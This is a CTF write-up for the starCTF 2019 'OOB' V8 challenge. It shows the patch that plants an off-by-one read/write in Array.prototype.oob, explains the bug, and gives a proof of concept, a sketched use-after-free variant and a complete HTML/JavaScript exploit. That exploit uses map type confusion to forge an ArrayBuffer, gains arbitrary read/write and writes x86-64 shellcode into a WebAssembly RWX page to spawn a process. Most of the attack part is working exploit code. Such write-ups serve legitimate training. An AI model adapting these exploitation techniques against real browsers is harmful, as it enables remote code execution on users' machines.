# starctf 2019 - OOB

## Chrome renderer exploit

## Setting

```
    fetch v8
    cd v8
    git checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598
    gclient sync
    git apply ../oob.diff
    ./tools/dev/v8gen.py x64.release
    ninja -C ./out.gn/x64.release
```

## Diff

```diff
    diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc
    index b027d36..ef1002f 100644
    --- a/src/bootstrapper.cc
    +++ b/src/bootstrapper.cc
    @@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle<JSGlobalObject> global_object,
                               Builtins::kArrayPrototypeCopyWithin, 2, false);
         SimpleInstallFunction(isolate_, proto, "fill",
                               Builtins::kArrayPrototypeFill, 1, false);
    +    SimpleInstallFunction(isolate_, proto, "oob",
    +                          Builtins::kArrayOob,2,false);
         SimpleInstallFunction(isolate_, proto, "find",
                               Builtins::kArrayPrototypeFind, 1, false);
         SimpleInstallFunction(isolate_, proto, "findIndex",
    diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
    index 8df340e..9b828ab 100644
    --- a/src/builtins/builtins-array.cc
    +++ b/src/builtins/builtins-array.cc
    @@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
       return *final_length;
     }
     }  // namespace
    +BUILTIN(ArrayOob){
    +    uint32_t len = args.length();
    +    if(len > 2) return ReadOnlyRoots(isolate).undefined_value();
    +    Handle<JSReceiver> receiver;
    +    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
    +            isolate, receiver, Object::ToObject(isolate, args.receiver()));
    +    Handle<JSArray> array = Handle<JSArray>::cast(receiver);
    +    FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
    +    uint32_t length = static_cast<uint32_t>(array->length()->Number());
    +    if(len == 1){
    +        //read
    +        return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
    +    }else{
    +        //write
    +        Handle<Object> value;
    +        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
    +                isolate, value, Object::ToNumber(isolate, args.at<Object>(1)));
    +        elements.set(length,value->Number());
    +        return ReadOnlyRoots(isolate).undefined_value();
    +    }
    +}
     
     BUILTIN(ArrayPush) {
       HandleScope scope(isolate);
    diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
    index 0447230..f113a81 100644
    --- a/src/builtins/builtins-definitions.h
    +++ b/src/builtins/builtins-definitions.h
    @@ -368,6 +368,7 @@ namespace internal {
       TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \
       /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \
       TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \
    +  CPP(ArrayOob)                                                                \
                                                                                    \
       /* ArrayBuffer */                                                            \
       /* ES #sec-arraybuffer-constructor */                                        \
    diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
    index ed1e4a5..c199e3a 100644
    --- a/src/compiler/typer.cc
    +++ b/src/compiler/typer.cc
    @@ -1680,6 +1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
           return Type::Receiver();
         case Builtins::kArrayUnshift:
           return t->cache_->kPositiveSafeInteger;
    +    case Builtins::kArrayOob:
    +      return Type::Receiver();
     
         // ArrayBuffer functions.
         case Builtins::kArrayBufferIsView:
```

Simply add `Array.prototype.oob` method to existing V8 source code.  

Commit is quite recent one, so, using 1-day exploit is unfeasible.  

Let's analyze the vulnerability :)  

## Vulnerability

```cpp
    BUILTIN(ArrayOob){
        uint32_t len = args.length();
        if(len > 2) return ReadOnlyRoots(isolate).undefined_value();
        Handle<JSReceiver> receiver;
        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
                isolate, receiver, Object::ToObject(isolate, args.receiver()));
        Handle<JSArray> array = Handle<JSArray>::cast(receiver);
        FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
        uint32_t length = static_cast<uint32_t>(array->length()->Number());
        if(len == 1){
            //read
            return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
        }else{
            //write
            Handle<Object> value;
            ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
                    isolate, value, Object::ToNumber(isolate, args.at<Object>(1)));
            elements.set(length,value->Number());
            return ReadOnlyRoots(isolate).undefined_value();
        }
    }
```

This is internal of Builtin OOB function.  

This can perform Read/Write operations by using like `a.oob()`  and `a.oob(1.1)`.  

The problem is, it directly use length value to element's backing_store for read and write operations, which is root-cause of off-by-one vulnerability.  

## PoC

```javascript
    let a = [1.1, 2.2];
    let b = [1.1, 2.2];
    
    // off-by-one read
    console.log(a.oob())
    
    // off-by-one write
    a.oob(1.1);
````

## Exploit

So, we have off-by-one now, and we can think 2 ways to exploit.  

One is that by setting memory layouts like `| A's element | A's object |` , and modify A's object map to trigger type confusion.  

Basically, Every V8 Objects have `map` which represent current object's shape.  

This member is placed at first of Object's class.  

So, it's possible to overwrite some object's map by using off-by-one write vulnerability.  

Another method is quite unstable, but possible to exploit this vulnerability.  

At first glance, `length` and `element` are cached.  

And look following code importantly.  

`Object::ToNumber(isolate, args.at<Object>(1))`  

`Object::ToNumber` references Object's `[Symbol.toPrimitive]`.  

So, if we install custom callback to some object's `[Symbol.toPrimitive]` which do free current array and spray some array objects, we can modify newly allocated object's length property.  

```javascript
    let a = [1.1, 2.2, 3.3, 4.4];
    let storage = [];
    let obj = {
    	[Symbol.toPrimitive](hint) {
    		a = null;
    		gc();
    		gc();
    		gc();
    		for(let i = 0 ; i < 1000; i++) {
    			storage.push([1.1, 2.2, 3.3, 4.4]);
    		}
    		return 0x1000;
    	}
    }
    
    a.oob(obj);
```

We can trigger UAF code like above, but already said, quite unstable.  

So, it's not a good way and i think this way is not intended solution for this vulnerability.  

The intended solution for this challenge is first one, as i think :)    

V8 Array shape is move from int to double and double to object, these kind of informations are stored in Object's map.  

So, if we modify object's map to other shape, it is easy to trigger type confusion vulnerability.  

For example, if we modify object array's map to unboxed double array's map, we can see all of array's member as double value.

And, if we modify unboxed double array's map to object array's map, double value is regarded as object's pointer, so we can construct fake object easily :)  


```html
    <html>
    <pre id="log"></pre>
    <script>
    
    function print(string) {
      var log = document.getElementById('log');
      if (log) {
        log.innerText += string + '\n';
      }
    }
    
    function gc() { for (let i = 0; i < 0x10; i++) { new ArrayBuffer(0x1000000); } }
    
    var f64 = new Float64Array(1);
    var u32 = new Uint32Array(f64.buffer);
    
    function d2u(v) {
        f64[0] = v;
        return u32;
    }
    
    function u2d(lo, hi) {
        u32[0] = lo;
        u32[1] = hi;
        return f64[0];
    }
    
    function hex(lo, hi) {
        if( lo == 0 ) {
            return ("0x" + hi.toString(16) + "-00000000");
        }
        if( hi == 0 ) {
            return ("0x" + lo.toString(16));
        }
        return ("0x" + hi.toString(16) + "-" + lo.toString(16));
    }
    
    function addr(ll) {
        return ll[0];
    }
    
    let storage = [];
    let obj = {};
    let map_unbox = undefined;
    let map_box = undefined;
    let ab = new ArrayBuffer(0x1000);
    
    let fake_arraybuffer = [
        // fake arraybuffer
        // map | prop
        u2d(0x41414141, 0x41414141), u2d(0, 0),
        // elem | size
        u2d(0, 0), u2d(0x1000, 0),
        // backing_store | 2
        u2d(0x41414141, 0x41414141), u2d(0x2, 0),
        u2d(0, 0), u2d(0, 0),
    
        // fake map
        u2d(0, 0), u2d(0x19080808, 0x19000423),
        u2d(0x82003ff, 0), u2d(0, 0),
        u2d(0, 0), u2d(0, 0),
        u2d(0, 0), u2d(0, 0),
    ].slice(0);
    
    let strings = "/flag\x00aaaabbbbccccddddeeeeffff";
    strings.length = 0x100;
    
    let wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 7, 1, 96, 2, 127, 127, 1, 127, 3, 2, 1, 0, 4, 4, 1, 112, 0, 0, 5, 3, 1, 0, 1, 7, 21, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 8, 95, 90, 51, 97, 100, 100, 105, 105, 0, 0, 10, 9, 1, 7, 0, 32, 1, 32, 0, 106, 11]);
    let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), {});
    let f = wasm_mod.exports._Z3addii;
    
    let string_addr = null;
    
    var shellcode = new Uint32Array(21);
    shellcode[0] = 0x90909090;
    shellcode[1] = 0x90909090;
    shellcode[2] = 0x782fb848;
    shellcode[3] = 0x636c6163;
    shellcode[4] = 0x48500000;
    shellcode[5] = 0x73752fb8;
    shellcode[6] = 0x69622f72;
    shellcode[7] = 0x8948506e;
    shellcode[8] = 0xc03148e7;
    shellcode[9] = 0x89485750;
    shellcode[10] = 0xd23148e6;
    shellcode[11] = 0x3ac0c748;
    shellcode[12] = 0x50000030;
    shellcode[13] = 0x4944b848;
    shellcode[14] = 0x414c5053;
    shellcode[15] = 0x48503d59;
    shellcode[16] = 0x3148e289;
    shellcode[17] = 0x485250c0;
    shellcode[18] = 0xc748e289;
    shellcode[19] = 0x00003bc0;
    shellcode[20] = 0x050f00;
    
    gc();
    gc();
    gc();
    
    let av = u2d(0x41414141, 0x41414141);
    let bv = u2d(0x42424242, 0x42424242);
    let cv = u2d(0x43434343, 0x43434343);
    
    let a = [av, av, av, av, av, av];
    let b = [fake_arraybuffer, f, ab, strings, bv, bv];
    let c = [cv, cv, cv, cv, cv, cv];
    
    a = a.slice(0);
    b = b.slice(0);
    c = c.slice(0);
    
    map_unbox = d2u(a.oob());
    map_box = [map_unbox[0] + 160, map_unbox[1]];
    print("unboxed map : " + hex(map_unbox[0], map_unbox[1]));
    print("boxed map : " + hex(map_box[0], map_box[1]));
    
    b.oob(u2d(map_unbox[0], map_unbox[1]));
    
    string_addr = d2u(b[3]);
    print("string addr : " + hex(string_addr[0], string_addr[1]));
    
    let wasm_addr = d2u(b[1]);
    print("wasm : " + hex(wasm_addr[0], wasm_addr[1]));
    
    fake_arraybuffer[4] = u2d(wasm_addr[0] - 1, wasm_addr[1]);
    
    let fake_arraybuffer_addr = d2u(b[0]);
    print("fake arraybuffer : " + hex(fake_arraybuffer_addr[0] - 0x80, fake_arraybuffer_addr[1]));
    print("fake arraybuffer map : " + hex(fake_arraybuffer_addr[0] - 0x40, fake_arraybuffer_addr[1]));
    
    fake_arraybuffer[0] = u2d(fake_arraybuffer_addr[0] - 0x40, fake_arraybuffer_addr[1]);
    
    // make fake !!
    let type_confusion = [u2d(fake_arraybuffer_addr[0] - 0x80 + 0x40, fake_arraybuffer_addr[1]), av, av, av, av, av].slice(0);
    type_confusion.oob(u2d(map_box[0], map_box[1]));
    let dv = new DataView(type_confusion[0]);
    
    let lo = dv.getUint32(0x18, true);
    let hi = dv.getUint32(0x18 + 4, true);
    print("fucntion obj : " + hex(lo, hi));
    
    
    // for my local
    //fake_arraybuffer[4] = u2d(lo - 1 - 312, hi);
    
    for(let i = 0; i < 100; i++) {
        fake_arraybuffer[4] = u2d(lo - 1 - 0x180 + (i * 8), hi);
        _lo = dv.getUint32(0, true);
        _hi = dv.getUint32(4, true);
        if (_hi != 0 && (_lo & 0xfff) == 0) {
            print("find");
            lo = _lo;
            hi = _hi;
            break;
        }
    }
    
    
    fake_arraybuffer[4] = u2d(lo, hi);
    print("rwx page : " + hex(lo, hi));
    
    for(let i = 0; i < shellcode.length; i++) {
        dv.setUint32(i * 4, shellcode[i], true);
    }
    
    // got !
    f(1, 2);
    
    alert("pwned");
    
    </script>
    </html>
```
